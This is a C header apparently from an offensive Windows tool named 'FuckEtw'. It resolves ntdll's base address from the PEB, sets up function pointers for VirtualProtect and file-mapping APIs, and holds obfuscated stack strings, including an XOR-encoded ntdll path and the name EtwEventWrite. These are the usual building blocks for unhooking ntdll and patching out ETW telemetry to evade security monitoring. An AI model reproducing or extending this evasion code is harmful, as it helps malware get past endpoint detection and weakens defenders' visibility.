#pragma once

#include "Structs.h"

void Banner() {
	printf(R"EOF(

	 _______           _______  _        _______ _________         
	(  ____ \|\     /|(  ____ \| \    /\(  ____ \\__   __/|\     /|
	| (    \/| )   ( || (    \/|  \  / /| (    \/   ) (   | )   ( |
	| (__    | |   | || |      |  (_/ / | (__       | |   | | _ | |
	|  __)   | |   | || |      |   _ (  |  __)      | |   | |( )| |
	| (      | |   | || |      |  ( \ \ | (         | |   | || || |
	| )      | (___) || (____/\|  /  \ \| (____/\   | |   | () () |
	|/       (_______)(_______/|_/    \/(_______/   )_(   (_______)
                                                               
				[Made by sorahed]
					[v1.0]


	)EOF");
}
//  FetchLocalNtdllBaseAddress
// ============================================================================================================================
PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after the local image name)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    return pLdr->DllBase;
}

PVOID pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();
// ============================================================================================================================

// Functions Prototypes 
// ============================================================================================================================
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

VirtualProtect_t VirtualProtect_p = NULL;
// ============================================================================================================================

// Stacked Strings For Obfs(Hard-Coded)
// ============================================================================================================================
unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };

unsigned int sNtdllPath_len = sizeof(sNtdllPath);
unsigned int sNtdll_len = sizeof(sNtdll);

unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
// ============================================================================================================================

// Xor Algorithm
// ============================================================================================================================
void XORcrypt(char str2xor[], size_t len, char key) {
    /*
            XORcrypt() is a simple XOR encoding/decoding function
    */
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}
// ============================================================================================================================
